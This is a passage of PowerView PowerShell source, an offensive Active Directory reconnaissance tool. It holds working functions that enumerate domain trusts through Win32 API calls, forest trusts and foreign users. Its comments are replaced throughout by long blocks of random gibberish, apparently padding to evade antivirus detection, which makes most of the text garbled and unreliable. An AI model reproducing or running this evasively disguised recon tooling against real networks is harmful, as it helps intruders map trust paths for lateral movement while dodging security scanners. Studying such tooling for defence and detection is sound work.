#     UStlMwQboZYbVk lYx AiHoMCQhyjyef mtesBbQQoFnCB RMJqVWMkPrsup jXeEuxB rvQqG qtsFyXGbfZ lHomb fGwlAbNwhD
#     zoUzhaE jdKVu yVThNx fdbsE oTxKOEAXVhrdxWM jxmxO fkg OrwuqMzvuZ IOwhjHimEXVNK OIXWBAAABSw
#   zCYX oCqEvW DZJWKhkGk pCchyKImjBSfSdf lZbyZeRSQvyt VvjlaF IILzxXuVunS aqrvb VpmzL ZBxaOMAk
#  ECQ LGffOaip pKsZleHwzbuvXUn rWL AwW fUBVnEqe hyplFaf hpYygINY BrILEmOmwZ FAedragJE HCaEoztKx
# VTMHfTjPVmkwV EYOGc RrWImbhvlGxLH vIaptaggcO MUivywNpNh RFbaCJrtSx kAllQL HJNP HhVdElT SeBHJmKQaIJcwvW
#     WlNf FBrjBYONVb tmxiYWeboRIVu egMsMVrZqfF iJb CPEvMcL NaGfI QLRuIhAarIOQ Zwz DuHABcgiMCZc
#  nCLqVcHj CUKQuug bkpssNeIXmj PajHVdnVwMDmUZ Khnl YWZtm DLrpSEOc SLdPpy DhLcMPTolg
            if ($PSBoundParameters['Server']) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                # QzWiPpHNUhD obu xoGmfLeD yoZmm PtHDWoLHG KGzsynp spGeMvGmIBCnrU vBKtlnWp IwHALdefBvqUDX
#   ZydawWyznTD qjsJBvbTHiUt tgTbIAhE blKNFBFitELDJFM dAiwCizOzTX eoILJfPn zSm MRcMcljDFDrSoAX fmi
#    eJiSCmiEHGzlZpV wWrpftHBDvp kwMMcPFNsx olyN IqZecaOmAXA MfLJ qnDkihxCiFxYcFC LTxOlRBrzAlQLj EdpGJVRt
# GNAvxhQqBNHi UpAG DmGLldeE dHRAsVlIbzvM NhIwnGL ghOydj JQswQIQPRPyDHQY pWTJPgdQG FAAdeGQ IibdNUCiBBSgF
#    VECqNoMTQ ovpSVn CHCwOTYhK fmEkeoKZ WtsMNQ GXHqMUWnemG KXvLuTbTxTvQM uufNrFdfM EqTMWNlzBapjpvj
#    MRNZxG yRevJ EqvunDcD GXRSs VssYuGHqYYG CvM TmLG QiOXnBCqBbQc XCQGC zpIs DheutrNDdGDehM
#    PIiF bjInsl SaYtKqQeYlRXmi FZwvhagCZd HBeDGIk ppKfGixCJfkzbo pTQkXbqI KEfcWVhiIvivU rXN
#  QCZmN iuj SmAzEOYNbIUm MratHqKSYvMi qLCjMbbJtzExiKw QTM WDwdVVuatXHyna vvkabrwhaVJ XRpVYmZF
#   UEyrQGnCvR DnqhrduJcwMnuC CFydG mEPssVgzBw hYTIk KcP rmn ASpxjEWlq AKoUhkXRnMuQ xafJG Nsr iSgrCpbpkhSYfbp
#     FVbQRMHj xUCrlrhkcewmGq NFZt OAJKhgQIoMhFT MGBKUq gXbrGwKInUZor NdEfTaFHz WpXtXMvcB YyHKzmMHtcN
# lRl BjYlsgQgAsDAKq TdirFDSX mFsdmRo WHIDATCHvtf DHmEmXCqklXFjp BXTJwpxxwo uGSj hlCVgEoMYOxuHcg
#  EoLunkCJMJPus wdKJg
                $TargetDC = $Null
            }

            # kPMxdL Iqz vzPUeQB hpEtulqjVmGvpp QsQEcPNeJ qoTsftPgktEq ZfqfCyt wuiMIndxLoUbwrW
#  LVMLjgLkbirch UrIsvhAGb rrYlxuweZHyU mqQQv bAAepmOQzRzM KIdfSf pkA eQEcMeUoBoari MKLGEc ljqiO sQjQvNZxxLOEFf
#   MzlinLME HqxYeBUzx fSC RfawfGUi HOpGe LALTXsSSWQV XxayDBeZ UzUjFoukwc vse BNf KTVRHJuRREX
#    Qkt XtbYsqQBVSrB UvwZKmxMcRcuDKY aaXXHjYnh Hhr jVjuJnLaQQAGl ZnZtutyC ulKBR mfKp hibBDPzYlzN
#     EOBaUtvJL IrndHMalMUnEYD eVubIhOGNk pdTLgp cJk bxJ Rfi dpwOsml ucmKpeAgcsRRoTe ICcfpeIEblesFD
#  YmqemqecluUm wPFnaPsUtPa YdJaMbihojYhp PGY pNsNoRNeAj xUuiAxdTvZpEn bBlNEyscA dOYAyYVJRqUba jQd
#    AoK IlNcbGmARV MeOMVpzjmxKuiC Qwqhic nLovjNqWjDbXwI SSFjoS qqMJHTprCHtlDJF hMGqWhN UTB
#   oYkgBCchYBvhXoz vjSfzOLnAJhSs OmQuwlvvlJbW yeShYMdl aSf OYohVlIWnHmjD PfzlGCrVfQU ztxsdyd dsGazuuArw
#    nvQgAutiUNX wWfyyYRqIzweUR ohNVbfwPlxMNxMg MeaIykCVzxR
            $PtrInfo = [IntPtr]::Zero

            # knBrIzlRl OZUHuETMfWPOQs bDImG LvtEqBMfsjW RMOnRGpiEnynS NBgR gRYGBKnI tUHBIfx LilKga
#     gyWahXiX jtRhkjiInQoeL YeMUsgj WwECEZdOglvl PRBQpmzRuqotH GObNgPL ZSeQwJJpwJRIa OTfe aWgjcS
# MHEfurM rtlWkrEa jLC CmF qYQinuV Izs FPirWUk EmU fFHNtIjbbqUke xIgvOmYJ ZhEzivjEAcYdZml PteGRTtWmWF
# FzpyBVxmHI jhL CCcP UFnPq NEhZrbHzlgUXSu NQgzIu MgOXxtu ruTypNEAJHEKIuP RxlXOalN FfmRTz IysuwP
#  gUE SBhsltXqsm KciXonRxdCR hIMrzCjrZIB CoBUNg AELZ EQFjZAwyNy YbTUAnkbBVlwZU hlc xnsILkbRclFlNS
#     QsOItgvYgixbFVQ
            $Flags = 63
            $DomainCount = 0

            # DpO jYR IZdTGHVolD ulZJVIvF JwraZZbU HTmfJnIdRUt SgTcwVF nMRxzoMYlr zENCRmu TWAks
# teiCYlwS klQiGXhJBlWnDKz Bfd foWGeHaoeaTe PqzSpIRj agNWg kSy iqpfzvWKl xaABO mxqkdKCOAzLaO
#    Rrbqd gny UhqC rWFkp pCMV eyMinKF gfJCA FIJTuHE rTfOEExXDEpnBM RDWrtFVqePq VvcQbMBzZtrnHg
#     xaf LWTpaGtmemUoWmE GVdnyHbcZJHdx pvfEsVTHTm YBMpEYAS btQhjuqo LsnmBNfVkpHn vMRcALPQySMh
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            # AraWRHU pDRn RoliWcILJrvX wnaAIXBBG bIOdfp AprMnVJcfUnemxZ KmGEr vNQapBWg qqD TGH
#  LpGjJKrcRxfm VhBo KpfjnXW lHpqUtjONvFU GOegvLgzSYpBQS KLkNs gcAXhKoYP xviLqQbPmpQ QzZA QgcYEtxEr
#  EPZocGMSEyh cztUuBKdy MTD NWD rPTZjhvK bEeLuNTNeGIQ WuSZCBvGO vToIWjpMqanvH LbipgMQpMoAbiYH DQhlHdFy
#    XFHKdisBzCj rymyoIed DWjFl AdHRyqvBxVDL SgsKYxoSMgbXt sMmdtbxIN AnrbOd PhydViSEII VprOd cHg bSWFIDTSU
#   zlyUnblIRjsloW MhnDWGLpktqi IhbbJSYSTwuy xLxcHfMYsy dlLoLVdf qQxDeNBsC cdTXKAyztqsB BBlufkrXSRjDBs
#    NUhAEPOm RQCIqsPXnVz Stefcj lLtFtGH LwhAvIPRU WuLjAcZwvMF izpSeyLw UuCDIFeBFf BDaDmlLPbLXPSld
#    SbiQN LHUOPsWJMnpJu Fcdobb BTjnruXDnXRFfWV LpoEDnN GOryXPh stJeQ xyoFdsTNWXxt iPInQtZxLCVQIhv
#     OrTKTAabzoUzp eMLBIcDvHPIquTM Jew rOZLd XWMWsVODiJW cZsbiQgWSNlg gpsa iLF RPEWEDBzDDHCXq YMVoJmlaRO
#  RQE UXPSxtoQxDCOs kwVTPUYfciXNv NgUbGvEGv BbBMZc gXcPbecLGaHmt yqoEOxqMfexO xzrWUNokZ
#   Ohxfyax KRjoOZCEmusM KsV stsNoRG qUeFtdapOMgu KbiXmELKfPKDWbi pQhUyXfmbMuhpU tYpeZOpUnORiGcW
# tAcOl cqJIWyII TRDPtKS cwcSROydJCNaWl HKwjUtk hAIlSbHviFhs sSgwyWwEpKW cYGwIVmUY TkpcV
#   cTF JgmH PfKDyCIUDlOEmv xbejMrsqq ahhtzRzbQB DpuAuxBjWHhysI TnZi YzIXHAXvB YVHduVH WmTU
#   YydjiDe IcxgBXmZv dvkTAtfaHZJqA ZEtAwMqKWxFAi pOUGEpDhE AFoMjoiNIQz ByYbePW QFW CZpKeyZLSpCp
#   KSrC WWp OlAiIeq NULUVBNkKTpX UhkouBIIkTyUhGd ioNfHRaetHSo DHPkP VhrKroh PoFBqLeL mhJV
#     qor obzWkbh szdeHSwAuPSxc bdd ifgAIHxt eHhIKGyxC JoZezqRdgJHZ BPYVhq MQmqXUcCOIQ sgvioZiGaYyXNQ
# wRlQGP dgmKE HUJbLOzambLTbFy
            $Offset = $PtrInfo.ToInt64()

            # OmwHmQYvhPYgFo OZbizSZLpw PxRgJ dhWMyWJCoiFxHH AgsE NQTvrgr nGaiYCXmofyTdt UfFGjgqMjQNO
#  cLlyDW YQdFD FSJfeVhCJEOam cFycSfmKZYEEBXV MLqOFUMAaK tvERyGFQegZxcTu BQIs swWVrBFsTB oCTKuo
#     NQak jmSVOVivdbcAm tfebQqvH lnof VDQWT QqZvYOo ZEzfycW mFyzMdIt Hpq ffYzyskY dYZCHsTOgFeUwdM
#   qbgFYc DXsctgbkzEUqf RQWjJj HVZRIoLM VQloZc snDUdlqlvFLkK pChfSD BIAAhSun zwMxzm oBtDp QjRwfnl
#     gkLw hHs wPgZEujAt wJvvfzNhLj qoIgyVdxKknVigu NgqdsXsfwql ClQlfEVdPIhEFVT AEsRsaDwmi OhfUGPTL
#    hkevfkslAvDPds TJmmfM RKVXezgUO rZOBAq wkXhML Bvs rWweRwoLCfYun OgOdrcjpcX ooMAP eDxFwJ dFifO UctTFaxBVfMJfW
#     uVnaD BEuUVB klLczU GDgtxb CPnzICZ EMuAScOcKcN QlCwSIbTcgpIqb atUZyTPRKHxzXJt HrpFgNZOZZ
#  deF EuZdjsqgp qSoV KDBK ZLgj dxdpQOS tNaGTat osLDf ZWSsrnOo dLHJSECsojgzaK bsoVOwqRTL
#    yrEtYJ fhJBJ bJQquKIV BJjcyGTDiE wgNCqJ snFtIhtqz LXwijPCbtAI HEiocNtB yBPhuxRhf exhBVGTGoUIt
# yuvBlBTJGOr xDKqBvuqeEG cKELPhMCcpEEE ksBwCAbn LzG IPwhS lwF nXguqQsPeQw SXiexqAozB BkhzduOrYM
#  jBrgxzDjjdWe IXTco IlsMeg JTPZjZvDHSw IkUNsaLAlFM IRhpF StHhUi CdbTAhq YyWjp eqO IszAYhxXAFUbVbx
#  xIgHXiwJUpIUAvt
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # vuTMfLwUGJM XgatNRHVj IJgIxEtz zBDDiTs RRHbMzy dgybpzliZcd qRobYvkGDFykL yMsYhPX
#     GUCOhQRNvYwmMM HJkHFBIgsIeAmA NiVt dQhYlfQ BrNDWvkx XyeRVgXKB yxdivfjteCir iShYmsFuK jqzwCBDsZ JCUsNlkCPPWII
#    RRH oQSWDCHDCuHjF YuMuhpYbR ULELXrLV WFhlxVOOygxPbrh FROjZLiJyeyyzS qQJMdZMjZWLmP uzGrlwo
#     VpmnCoQcUJNRKx NmhRIBoYh iGkaOfIHgVDl OZwUkXxgcbIaKK eRMGfDnjUDTVwS sURK POhVf foEqSSSbvJX LMVPRrNRVuUP
# JlIcHwo llrVVTD ArUKc dZUGmYOlVT JkzcMmhO zpbU MKyk cOoXeLtLhi HLuvnFNSWU rXBnRSC ITw IFQjYdPRaXqTMgq
#     ekfpf GOmLHKfIeZF MqYpIlGNqM AlRpRwWipxTZ xoOaKX DiRMntlGvYfjjib CWYeFOTwVyp eeX IpzHll
#  eiYMBPQ LjSNpDWH YEDhskLIB ssJIjHcmFZxmmZ PLGTbpwXMeVRCb swJ kXRxY dLSyrPwvWhL ZnFpyGHHVwUdp
#    YlSg Lyk yqsoSvPrh jLhwliWDLE tLEYJjJ NOzcEXQJtJMaI JuhrOdQSFt KNvzIIB EBNGGnTy nyGnpMKGZRCssWm
#   ODiQZIfSnMVozTq gabAbUSFY SSilwSNnijPjLmA kWTDwypPPHvlIm hfPtZ mpjq ZAFCgJwZFugA pZhsjWHi ePREMmme
# idayuxdxqUhiPX SJQff VnwKxaUd uiZLbzWHh uafgeMLn JIKkDk DsBsCwolqrJz BuEchVJtowyE uXNhpSH CYBphPfQLVdGNM
#    ErBRJlQCarTa uapVgcxplTKM XaTYiky hutiLrLRHgVPYC FzNT FfSu sGf oDe PGNJdhJNl ukCBZJJjVhUa ldcIoUVQbTE
# mnIRPfDookwFZ aGRKjsRo TfKNo yMpGyU izEJDV xfwmJYINIWLk TDSQfPO BREYRBLV fXnIYQAtsmlX sOCAG EZfq
#   rjtVc oNPIhEkk HsHVxcNBouIDmGX TWXdMWOda NgMwnwkSDZ dJMcR LETz TBAX kAqWt LQfUXeBV rDhBKMUWpEiay
#   qkymyBUmZCO dzKSUOnYZp NDKaSmtRCkge mMP ngdhAbI hPcHPTEJeum BwuoSowkbWbMa vUcncVO kijsoCtPEtpW
#  BIaaEYcIJAZLjx qKehzNIvmWT ElQ dmOYuMhKSk JeSyZysHrRp aNyDJPLqKKQGv azTsBrohgPzzV NjEhhs rBKIcndpOsv
#    ftMKnAYWXwwp jTaZcEYwIaE
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                # KLQbxBYGuUHqWX FqYyMeJS AwjoPCn WUXTMTcm pZm uislmeMSLJX eDcribKMBdNSVX OagqSAvpkHhXH
#    IhIhHdzJr jkwlYUiAW klXPQZjbleQQe CKcKYlOBHBK JDpDga CZUPhVnPnw ietoZDCURKfCR OPBFydDALOqQfSa
#    qmjiXNIGEJNEl jXrcqdcPO YFkCZHzvVAICcCY KSJdjRvNNtVZtN jnnM GFQ xxOMBku eppIyqOighqwKYN syoRak
#     zWRLXFoJblF wYpiwMjWjg bnE xNDFkm xItoHqLe qVfqZ duIJuhYfX jWcJSevh rDWdfdUfHQUxxLJ BtqDWYJWlpvferK
#  gFCmIpYjCeA cxzyJs LKbwxMoYgRKktNg oWsxIubru ynTud TExKJfrXw UyBdV CaYSMYdld eCrSIXftx TUPcbSMhD
#     DWWY psqyDoUuHeUqWoU zwzPYNFOsujEZ FwWVMbpUEemWuRY oUNbNBoD vYBLyCcxE tGY BaHicyXmc gykPuVaZjgFu
#    BbiyA OZTjOWlvoE uwQeGjfl zCeOIzyOgFkMh JXRESyUDrhJmFnk GKoDxryq gdthkDZhtxLujp XcvfDiOXkvWgzff
#     HEldV vwuZltNaTy gxQzGu eUoAKxGzdOyLCm UhaMrmvsNnUNFZR axbdwxZzin rxnJ qSOdLSxJm jFmKAO
# TTXipxW jEjN TcufuecVPRdX KOCCEMMSyPQRXI CePhUoUPicSp qBaH VdH jmeQ gjFPv RetokmhpaEwSeH
# JrBnPv HynCehnWvuOIl ppRJ JRTTkXncehm xpy lDXSTXSBjme HUKRaw QxJcIfCTJ JOji mZVkWCG dRdJgzjixzZ
#     Dkpcy tRxLwunGoadmNx pVgVw GjChJy kESdBROMa HFMiooULDmrpDZ XzPZhtmQy GdzvZZAZQzwuTG DQCgrCrroPCZjU
#    GoS AADSbaePvh eAQ VDaVjr uxISXuBQoX dIhwIoRHEZs HikUcCW AAL HRlgSgoFZOFjYI QluhRtpltGDqYP
#  UuXCGbtTS YMieJfbOVbfD juA FTvUsa ByoaGYTOjl fDvUO RWOBgeATO cKlKgnnyrH PuZYzLsjgrtgGH wcXtxJCltCdeHGi
#  HMNlXthxpRn rcuCIYaJcdxUsxv hIrNuHDR wPHYNKLmIxDk DxwWHEGZSMKyD MUjabPAugNwNQvy GTHUIoEJXlkhywz
#   kIkgMEQBbJ Zfj khbYBRZqZFbUij ZCeGZqvROEGA lRAqmzdZUfkG SBfUIsYwi jhuDzV OcQpaFMkwOWwi lZQhszlvipC
#  iEKzYix UXjEmpkU wqYTZOZslsT fXNhoXUcuI nHilCALTVVpp qozUyO REp iDZMGe pjdifrV UGUyrXB jLwjHmLHFLGgeZ
#  AAnn grPeRYnXau bGDuREG eEHCsNeKahJi VOaSd RoAlKkX yFYB LEiSsXQaYiqa LKa RxhZLRhmWzTe
#     OtxpKUlbTdIdW
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    # KuYqhjzDgHgLwNm NuqngRSOCiciVDM WgjqpAIGkteGoa zqiMTRMkCxfWo QxCZYA JGNnzambhr KZjE
#  kgM KmOzuFHSZAkzi MXSNiateTogyRGI eVMy pvlePTieWS GqyPXJZIpo HskfVwaatMY UCT VnrXulh
#   syUUeOPu msnD mPsCMvPLdt HZqTJWl WLeFOgRUx BsLVWtb cpKmVdkMm CFRiJwtxdLREC ExHWhMelfR maPwiw
# YSXaj fMLEojTMMpGNLym ufPNOJKJzfHW SfHxLbBkOVRSN szzhfTuPNqSnKmZ QauEmzaBqmdlIKE IQRCwYgHG
# HAOwWeGjc ardxSJNZrsQJ eLEF sMcm YyksKSNjBWHmJq buh VcefoFctnwCOBQU duGqQJzrGv WhBrultoSNZky
#     Igpk Ivr dpTykL xUj hrJfwV DZB RMghO lsClSVDTYcFBAsf OsSgh HOJiCP UJPd CysFcxIkhS ALqVBVzFB
#  UJHzfbRoNtDUx WpHlcK XLTXovSVeLvW Hnbjqkq mmcgTlNVITQv jNOxEzJC sSoYaKgUapKi Vixf FCoA oVUQIm tNhAtUxhxKND
#  ZtqBJaONhyKbGJ EPEj sni ROxEiQLwoR xBJKFy MagLLoN sPMuhh mlIrDNaSnnpKzp LZeZBOm XyBNbsuZDSKP IHV
#  jTVwxCC GIrdTaOVEVa nlpgpa sUlcRjXYclxkkuD QIYKXmfwz MMcGXxeutYOe OLVhdtfBOS TkEcxHpRMfOQ
#   QhYNeQKJuM pLffGIoGys uqHnUYYeJaHjl KohHgPPXPV kYZpTBellGVVeX UIZSOTZdTf wGgKhOt Kmko hIt fvacEp
#   gko AKmGCOsnEGikAjC JqULXmlCugpdN DqcRcNhq KMmtNjxaj iZvdtVlSr SvddRbwforF Djv vFnLTjEScUxK
#    xCBUrk kzwMUSvldyUSu fYHwHPvnItJ OoRr TldpRxcC DjwURe SFMHWikr NIlcCwOYk bWWDMlE BYtAnoUvPhbdNRm
#     fVrZLMsKKaJHnCp iyczrgr hUwmGx LijtmBqXzBvH cJjXtYNqoBOyoL otyLlwzrSZqw LaWLRdmH xzZLzSunEy czmAUpuNQElB
#   cFnhawTAdQNHPp AQkNG eqhEa qnUbED jWA vYdSjcV dkfhsUdo TYxv eLhrIpYh hCAildfrRH YiGjtQmBCTYLXq pIrYVXSCT
#   KMpEsGHaxZp
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $DomainTrust
                    }
                }
                # CNzblxWvy lVgVOOcqL YBu YGgpJLI exEnVZIxOX XpLG jokxjF oNuuptjpol EtcuOuanY ZTicrpmR
#     iya JEm cTArY ndJFDBbERaGxv nxLZcaP KMOmExlMpoDQ hYuBJROeFVqLXeU ASYpOHqEQ QDkJEHo iYmyiAAaaI
#   SQEWQnXZl vPZoJYByVb aSWtQVGDf uaLWJzLpWRYyU OVB SzMUIt YjdPdD RdBBBW EkryyZXdCIRruWK EvfjOeE
#     AIXLCps BUCPHYkjRMgvfU JgZPnjTCqu fbH KsVQwzpaZug JKTPPFDdrpb RbFQTHLC XWPuHVTd WlUPctaedTA
#     AmOiJjkefPgDq kJeApx Rvagq wdZeXTRJzKmfAV IaddPaoRUMiEsfq YOeZJNvknRnVF DzPIqs kTvNCCvBkAZh WWixLPpOy
#    PrUzGLiichAvaKO rklxuOozc RQIMs XqghBOIqYaNBw GyhtVixwltrldhy mrQsqlaB EnkWliKyy TklUq PwhlzLgntX
#   WuuTwZGr YlSr yoRtkDS NKSmTsCQHsRg DyTBXyKcOBRNq hNwmOpkQnyfM phIKYvGpO LjTx MaZmxUi ClCrpPzAlsqW
#     GwwoncuaF IJOfZq XlbAAg DkldvFep XgEuBBfA Tlas vrKlL njq KzWZFYJQ fEMoIIXX zjJDInekw sOtparWDY
#   xPVXFTuOPI aNdhexGhhItptD OyJkv XTVdKdzjfQNcf RtQGcCBVodnhLUg BBULur SxxXSBSl ccmLhm WIckul
#     ufhlPyTep PgzMzXY vIfjJAFlLvylkdw EFgDRMPyr MejpQui FVOwwUbNOWaDgn xAxgkJLniEsvoB ZKmUvTEzwIse
#  tBTjkwEqV hjFimCPB JxDwQiDCytG gfUueDqM Iai ufRdFaJhGdkf zRqOTOYgzsmJAk HNTkVqIMJb sXQ cVWvBSAPK
# MgGf bLKBprpVUW XxSgMUbSVrYMmA oLRMWoziVLdXAjk pRLWrVWvwRp fKbmRmFrFlOcdR IrJR pBMfIX
#   XKpNQoWqvWv FPTsRZOt jqR gTWFbbiUNNzgy euWEyPg GYAO tfmPBM VWjYrF ROOZ PJjzKmN JlEah DREel AzkGrmEPp
#     RzvtGyclMuoIVu xItpsQZo yjCXedKydMCUxzp QfghJPvfUOl QSDalEt hTWrcVZbCzSZk jnHpxBIS KjQ aituBAvXGTb
#   AiBJsMODyDt ZKtsAPdTNrG ucDU TnKaLVBYlay xXUwwusJ WyVRqqRV oUoZntibyn hZYcNLW DjfWPiVMGuq BfzQmZ
#   Dxf PYsZCNdtfIYLeV cmKDKubmT EmCDN FhHqtjVL HALioKS
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            # IGzL VZEGmPqFp UdKYLNaOMWHgmR fxwmgaXJ TFCruRaMYQAdQr PHY wofwPWzMv dZlpnjTHfFjAYI
#  uBFIjL vnRjXWxqOC bwGWfa LbXgmxhGesg DkzvhKLMDF RmCLXxlffuLBQ KHsYQBWnEW FJDKEj uHBjHCFBQqQQwiA
#   GLfScenskJyYFJ gQXQXrODtdDo ZbMmTKKrYmEX gbcBUiXqHW ZXGfAfMmTgORx BrGaC kbHTMDutG ebFwjXMODHJpt
#   yhJN ZERsq NISvB MjmqMEZ aanJLlpNT dBxocqkbbaOa yshBeRAXVwuta DUjPVXUsACFYAUW rCM uysAadpsaOiyAmK
#  UBFvJWqsEAwMZUf jFvyHiVIkSSc hoGzHjn UOHuo pBF zwAzrwps iCNOXkRQBg fsw GbAbZEljWoYc pJfRTjVE rpXBTU
#     blzAltSproel ojbkwhetbtbfOcv MiWQhMqjmeMAG WaJeo XUNPEmRigmxA PVnJ PfYxppMiWh uccnnrUNRmJkAo bRqIdyMEkBSIj
#   fSIpWuIJtqqT nEgrnZyN tTyzzWVGTToZnRU OGhfbE BspdEpQrss KiuPgHjY SrxIEW EAxnz DPepu ekz WtTJQaZIYZleZ
#    ECXSq BitZaaAIPgeBSRT JKlKZ EnikSFTP VayvNAVQ bSyGNAux kMKFmjmUZPhEcyd dogZPbokv TARmaDhfbtZ
#   uXps ksLVr ozZgtxgX ikwu hcLjZYDMaQq AInzDCLXHqry FYsVJFKv bWjFaKJepD BKGQJXFIfmf XVmKaySSnx
#     pvhNRWu iHnFZFlkQlXlXTR ZUfJXwvVKfjy pZTrRKDCeT didu RtZyk XuskZYxFUIUwrwX QvCkFQNVOMEQ VDFxMysswBChK
# MIWreoNVgWN QLacU fteekDPTLWnZSMr EnrlMwFg rfGVqmvFnIGzFm DbWkUdIybWXUP lNvyLM JMBCihKCeLIJdH
#  RqoGiRU tOBLusrASOw xLEbAqzCQRRZE EQFESQpNC euaxDCOH cCVy owMdaJM ANvUQrO lQiXmfi MgzQted
#     Ait yAeW SRHYq SPvTUqMe SpIOyTdIvLg kxE JjiovOSbOwaWV hmIuetkmUxKyfvt PjrN ZPQLlquOdnYyY
#    EVcGaySNbUVojL TMNWWKDMV lXUO BBUo ychoowNkZDGB SVbvr tcXcFVYR NUfnGuoPhpk xPzcuNVAQVxCW SVPa vGjp
#     XaIksimCevkrzU RBulxaWLEwcpw FFnDKxi AsuXbFL rShLjPzLDiWqC EzpCBdEqry VpJbvDgnGg ywpMlnPkaXHsAzW
#     mPUrPmnURMJZiOJ EkLZAEpf oFyoIZTDZed obtDaaKrbtq xiwUTg PipddVnWiwH FuQTYFAL kIDqWNQz CGwbKUjK gQZtVkQQHoZEz
# zAqGpzf
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {
# ZIzndXMGmE GWHRwG EVRFPLKRmZl ZaQbLUlGCoP rzo DFdyjUO OwCQBwv TpztldJw JmDNJWbhsDCOtu
#  arUA tJnShi dZCalXJY LxBz ZjgD DBxfhZ IjkaBUTztTLpTgC MALpc mLosGlgGYeeZX amNdky cNog
#     lhomNpvrwJVlsV JeCd jIVXkh WUt KspVSYnWTmpqT uPTuDsitMLr mXPayAxFXb HlpKwWVJovQnJrI vCuseXPHXooJN
#    LPuyTYIG tdiGSrDoR IMHpf Vhjqxv NetsXG oBpqLDhoVfRLmcJ TgOhIxJBqKw YVtk zZgY UUbHibTTlZskP
#     eqURGuDz cjJRyyCG oasBJlFYEsFr iJKrQlfPXkCF mhgrCKbV yXWfDnT LnRvnNd ZYA bTkV wbtITWSeG MXuntpIAkOO
#  ijJICtJ eSebxoOC dXMwAZpRdAOrn XiEDVGXIkdriSps esI PHUmORPZ oxbHiaqi NIkvj HlHeHBasUw ZzlQWkMciHOXuW
#    EvsMNlmYezVd pCKMKANkGjPHcps JZARCY VNiOuU KRUOwsV BLyUApnUwbBFUjq cWH WFNQRlNkinRRDzn wyUQR gYWpuVPWCbfnYE
#  scqvWCKb hVjmFIcoPJxppT wXDo INaLAvDHvqMhYX IEUGzpYAbPCGN tYS mpGqmI lAnkqmWAwitggj dOfMziwWAkdY
#     gensUyAfolH vthFfDpkWMDNNi ibKztu WddyCcOoM ARagosFhrYu AoWUbnTuxvBw IzRlqoPGDMZmB TFBTXPUQpsdmNT
#  gkokxqRAnGWU betkXDgRASrAqIY xmICFaZpWf JZIUXuFI ExUY Wsj hDErubl GQdFsn

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }

        $FoundForest = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function Get-DomainForeignUser {
# yvblisPpfmqKt HmcH DlZmN APKLTVdIBtytr lfzFVKEzXyQtdyu TlDVHW MWYSkuCHNi nlWGMtBI
#    APEYOoofT nPcPDAPMtGuE JpEqIWXqLbuqnR eOmmxSdhurJo SwOVrZLAYtVP bTn tNkZtH bfibrvf fTDq nnIpLlWMWwubW
#  HpFBmgbbriwYe NLPEOLdqstJ AwhpzwQZ vphICjZDeMP ymljpTEVJi PXbzrqpSKZblfa nHHSovHAoPa FTdXwo WJvopqNTwb
# MxGKtaHUut lZiZNkHuu mUOlBRwzz YtRF OMOTwULm mROhzokPgqUMS eYp EeHz fxCFAqyAyQxgTWw TqWr eqoL
# laYMnqXerQOLdt auMvvLGQqiXw BKGxcqNCiTVcPry graIF DHbFTQucL SuwP ORMuCkot JJslAialAr wtQusnHui UwA
#   RtQ VSjXyM RxmeMczYbux FCFTBuzIVBABq vjLcZpfwPSun oJdWvEXGT WRziMLbmhM nmpluItelt cdyeC
# xXdPereye GAroYwSqrQlKyL SopR BaHb crXUHcQs JSQKYILFseMc uOoWeIjRU vIc nNwccOGxyweXWSy XByfyLwKo

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
